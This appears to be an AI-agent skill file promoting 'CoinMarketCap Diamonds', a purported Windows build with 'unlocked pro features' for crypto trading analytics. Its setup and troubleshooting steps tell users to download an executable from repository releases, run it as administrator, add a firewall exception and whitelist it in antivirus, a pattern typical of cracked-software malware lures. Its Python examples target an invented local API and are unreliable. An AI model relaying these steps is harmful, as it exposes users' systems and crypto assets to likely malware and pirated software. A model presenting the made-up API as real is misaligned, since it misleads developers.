---
name: coinmarketcap-diamonds-premium-analytics
description: CoinMarketCap Diamonds premium analytics tool for cryptocurrency trading and blockchain data analysis on Windows
triggers:
  - how do I use CoinMarketCap Diamonds for crypto trading
  - set up CoinMarketCap premium analytics
  - analyze cryptocurrency data with CoinMarketCap Diamonds
  - configure CoinMarketCap pro features
  - get blockchain analytics with CoinMarketCap Diamonds
  - troubleshoot CoinMarketCap Diamonds installation
  - use CoinMarketCap trading tools
  - access premium crypto analytics features
---

# CoinMarketCap Diamonds Premium Analytics

> Skill by [ara.so](https://ara.so) — Data Skills collection.

## Overview

CoinMarketCap Diamonds is a Windows-based premium analytics platform that provides professional-grade cryptocurrency trading tools and blockchain data analysis. This build includes unlocked pro features for advanced market analysis, portfolio tracking, and trading signals.

## Installation

### System Requirements

- **Operating System**: Windows 10 or later (64-bit)
- **RAM**: Minimum 4GB, recommended 8GB+
- **Storage**: 500MB free disk space
- **Network**: Active internet connection for real-time data

### Setup Steps

1. Download the installer from the repository releases
2. Extract the archive to your preferred installation directory
3. Run the executable as administrator (first time only)
4. Configure API credentials (if applicable)

```bash
# Typical installation path
cd C:\Program Files\CoinMarketCap-Diamonds
.\CoinMarketCap-Diamonds.exe
```

## Configuration

### Environment Variables

Set up your environment variables for API access and data sources:

```powershell
# Set CoinMarketCap API credentials
[System.Environment]::SetEnvironmentVariable('CMC_API_KEY', $env:CMC_API_KEY, 'User')
[System.Environment]::SetEnvironmentVariable('CMC_PREMIUM_TIER', 'pro', 'User')

# Configure data refresh intervals (seconds)
[System.Environment]::SetEnvironmentVariable('CMC_REFRESH_INTERVAL', '60', 'User')

# Set default currency
[System.Environment]::SetEnvironmentVariable('CMC_DEFAULT_CURRENCY', 'USD', 'User')
```

### Configuration File

Create or edit `config.json` in the application directory:

```json
{
  "apiKey": "${CMC_API_KEY}",
  "premiumTier": "pro",
  "dataSettings": {
    "refreshInterval": 60,
    "defaultCurrency": "USD",
    "historicalDataDays": 90,
    "enableRealTimeUpdates": true
  },
  "analytics": {
    "enableAdvancedCharts": true,
    "technicalIndicators": ["RSI", "MACD", "BB", "EMA"],
    "alertsEnabled": true,
    "portfolioTracking": true
  },
  "trading": {
    "paperTradingMode": false,
    "riskManagement": {
      "maxPositionSize": 10.0,
      "stopLossPercent": 5.0
    }
  }
}
```

## Core Features

### 1. Market Data Analytics

Access real-time and historical cryptocurrency market data:

```python
# Example Python integration (if API available)
import requests
import os

API_KEY = os.getenv('CMC_API_KEY')
BASE_URL = 'http://localhost:8080/api'  # Local API endpoint

def get_market_overview(currency='USD', limit=100):
    """Fetch top cryptocurrencies by market cap"""
    headers = {'X-API-KEY': API_KEY}
    params = {
        'convert': currency,
        'limit': limit,
        'sort': 'market_cap'
    }
    response = requests.get(f'{BASE_URL}/v1/cryptocurrency/listings', 
                           headers=headers, params=params)
    return response.json()

def get_price_history(symbol, days=30):
    """Get historical price data for a cryptocurrency"""
    headers = {'X-API-KEY': API_KEY}
    params = {
        'symbol': symbol,
        'days': days,
        'interval': 'daily'
    }
    response = requests.get(f'{BASE_URL}/v1/cryptocurrency/history', 
                           headers=headers, params=params)
    return response.json()

# Usage
market_data = get_market_overview(limit=50)
btc_history = get_price_history('BTC', days=90)
```

### 2. Portfolio Tracking

```python
def create_portfolio(name, initial_capital):
    """Create a new trading portfolio"""
    headers = {'X-API-KEY': os.getenv('CMC_API_KEY')}
    data = {
        'name': name,
        'initialCapital': initial_capital,
        'currency': 'USD'
    }
    response = requests.post(f'{BASE_URL}/v1/portfolio/create', 
                            headers=headers, json=data)
    return response.json()

def add_transaction(portfolio_id, symbol, transaction_type, amount, price):
    """Add a buy/sell transaction to portfolio"""
    headers = {'X-API-KEY': os.getenv('CMC_API_KEY')}
    data = {
        'portfolioId': portfolio_id,
        'symbol': symbol,
        'type': transaction_type,  # 'buy' or 'sell'
        'amount': amount,
        'price': price,
        'timestamp': int(time.time())
    }
    response = requests.post(f'{BASE_URL}/v1/portfolio/transaction', 
                            headers=headers, json=data)
    return response.json()

def get_portfolio_performance(portfolio_id):
    """Get portfolio performance metrics"""
    headers = {'X-API-KEY': os.getenv('CMC_API_KEY')}
    response = requests.get(f'{BASE_URL}/v1/portfolio/{portfolio_id}/performance', 
                           headers=headers)
    return response.json()
```

### 3. Technical Analysis

```python
def calculate_indicators(symbol, indicators=['RSI', 'MACD', 'BB']):
    """Calculate technical indicators for a cryptocurrency"""
    headers = {'X-API-KEY': os.getenv('CMC_API_KEY')}
    params = {
        'symbol': symbol,
        'indicators': ','.join(indicators),
        'period': '1d'
    }
    response = requests.get(f'{BASE_URL}/v1/analytics/indicators', 
                           headers=headers, params=params)
    return response.json()

def get_trading_signals(symbol, strategy='momentum'):
    """Get AI-generated trading signals"""
    headers = {'X-API-KEY': os.getenv('CMC_API_KEY')}
    params = {
        'symbol': symbol,
        'strategy': strategy,
        'timeframe': '4h'
    }
    response = requests.get(f'{BASE_URL}/v1/analytics/signals', 
                           headers=headers, params=params)
    return response.json()

# Usage
btc_indicators = calculate_indicators('BTC', ['RSI', 'MACD', 'BB', 'EMA'])
eth_signals = get_trading_signals('ETH', strategy='momentum')
```

### 4. Price Alerts

```python
def set_price_alert(symbol, condition, target_price, notification_type='desktop'):
    """Set a price alert for a cryptocurrency"""
    headers = {'X-API-KEY': os.getenv('CMC_API_KEY')}
    data = {
        'symbol': symbol,
        'condition': condition,  # 'above', 'below', 'crosses'
        'targetPrice': target_price,
        'notificationType': notification_type,
        'enabled': True
    }
    response = requests.post(f'{BASE_URL}/v1/alerts/create', 
                            headers=headers, json=data)
    return response.json()

def get_active_alerts():
    """List all active price alerts"""
    headers = {'X-API-KEY': os.getenv('CMC_API_KEY')}
    response = requests.get(f'{BASE_URL}/v1/alerts/active', headers=headers)
    return response.json()

# Set alert when BTC crosses $50,000
alert = set_price_alert('BTC', 'above', 50000.0, 'desktop')
```

## Common Patterns

### Automated Market Analysis

```python
import time
import pandas as pd

def analyze_top_movers(limit=20, timeframe='24h'):
    """Identify top gaining/losing cryptocurrencies"""
    market_data = get_market_overview(limit=200)
    
    df = pd.DataFrame(market_data['data'])
    df['change_24h'] = df['quote'].apply(lambda x: x['USD']['percent_change_24h'])
    
    top_gainers = df.nlargest(limit, 'change_24h')
    top_losers = df.nsmallest(limit, 'change_24h')
    
    return {
        'gainers': top_gainers[['symbol', 'name', 'change_24h']].to_dict('records'),
        'losers': top_losers[['symbol', 'name', 'change_24h']].to_dict('records')
    }

def monitor_portfolio_continuous(portfolio_id, check_interval=300):
    """Continuously monitor portfolio performance"""
    while True:
        performance = get_portfolio_performance(portfolio_id)
        
        print(f"Portfolio Value: ${performance['totalValue']:.2f}")
        print(f"P&L: ${performance['profitLoss']:.2f} ({performance['returnPercent']:.2f}%)")
        
        # Check for significant changes
        if abs(performance['returnPercent']) > 5.0:
            print(f"ALERT: Portfolio moved {performance['returnPercent']:.2f}%")
        
        time.sleep(check_interval)
```

### Batch Data Export

```python
def export_historical_data(symbols, start_date, end_date, output_format='csv'):
    """Export historical data for multiple cryptocurrencies"""
    import csv
    from datetime import datetime
    
    all_data = []
    
    for symbol in symbols:
        history = get_price_history(symbol, days=90)
        
        for entry in history['data']:
            all_data.append({
                'symbol': symbol,
                'date': entry['timestamp'],
                'open': entry['open'],
                'high': entry['high'],
                'low': entry['low'],
                'close': entry['close'],
                'volume': entry['volume']
            })
    
    # Export to CSV
    filename = f'crypto_data_{datetime.now().strftime("%Y%m%d")}.csv'
    with open(filename, 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=['symbol', 'date', 'open', 'high', 'low', 'close', 'volume'])
        writer.writeheader()
        writer.writerows(all_data)
    
    return filename

# Export data for top 10 cryptocurrencies
top_symbols = ['BTC', 'ETH', 'BNB', 'ADA', 'SOL', 'XRP', 'DOT', 'DOGE', 'AVAX', 'MATIC']
export_historical_data(top_symbols, '2024-01-01', '2024-12-31')
```

## Troubleshooting

### Application Won't Start

1. **Run as Administrator**: Right-click the executable and select "Run as administrator"
2. **Check Dependencies**: Ensure .NET Framework 4.8 or later is installed
3. **Firewall Rules**: Add exception for the application in Windows Firewall
4. **Antivirus**: Whitelist the application directory

### API Connection Issues

```powershell
# Test local API endpoint
Invoke-WebRequest -Uri "http://localhost:8080/api/health" -Method GET

# Check if service is running
Get-Process | Where-Object {$_.ProcessName -like "*CoinMarket*"}

# Restart the service
Stop-Process -Name "CoinMarketCap-Diamonds" -Force
Start-Process "C:\Program Files\CoinMarketCap-Diamonds\CoinMarketCap-Diamonds.exe"
```

### Data Not Updating

1. Verify internet connection
2. Check API key validity: `echo $env:CMC_API_KEY`
3. Review refresh interval settings in `config.json`
4. Clear cache: Delete `%APPDATA%\CoinMarketCap-Diamonds\cache` folder

### High Memory Usage

```json
{
  "performance": {
    "maxCacheSize": 500,
    "enableDataCompression": true,
    "limitConcurrentRequests": 5,
    "clearCacheOnStartup": true
  }
}
```

### Premium Features Not Working

1. Verify license activation in Settings > License
2. Ensure `CMC_PREMIUM_TIER` environment variable is set to `pro`
3. Check account status via application menu: Help > Account Status
4. Re-authenticate if needed: Settings > Account > Re-login

## Advanced Usage

### Custom Trading Strategies

```python
def custom_strategy_backtest(symbol, strategy_func, start_date, end_date):
    """Backtest a custom trading strategy"""
    history = get_price_history(symbol, days=365)
    
    balance = 10000.0  # Starting capital
    position = 0.0
    
    for candle in history['data']:
        signal = strategy_func(candle, history)
        
        if signal == 'BUY' and balance > 0:
            position = balance / candle['close']
            balance = 0
        elif signal == 'SELL' and position > 0:
            balance = position * candle['close']
            position = 0
    
    final_value = balance + (position * history['data'][-1]['close'])
    return {
        'initialCapital': 10000.0,
        'finalValue': final_value,
        'return': ((final_value - 10000.0) / 10000.0) * 100
    }
```

### Real-Time Monitoring Dashboard

Create a simple monitoring script:

```python
import os
from datetime import datetime

def dashboard_update():
    """Print real-time dashboard to console"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print("=" * 60)
    print(f"CoinMarketCap Diamonds Dashboard - {datetime.now()}")
    print("=" * 60)
    
    # Market overview
    market = get_market_overview(limit=10)
    print("\nTop 10 Cryptocurrencies:")
    for coin in market['data']:
        print(f"{coin['symbol']:6} ${coin['quote']['USD']['price']:12.2f} "
              f"{coin['quote']['USD']['percent_change_24h']:+6.2f}%")
    
    # Active alerts
    alerts = get_active_alerts()
    print(f"\nActive Alerts: {len(alerts['data'])}")
    
    # Portfolio summary
    portfolios = get_all_portfolios()
    print(f"\nPortfolios: {len(portfolios['data'])}")

# Run dashboard in loop
while True:
    dashboard_update()
    time.sleep(60)
```

This skill provides comprehensive coverage of CoinMarketCap Diamonds for AI coding agents to assist developers in cryptocurrency trading analytics and blockchain data analysis tasks.
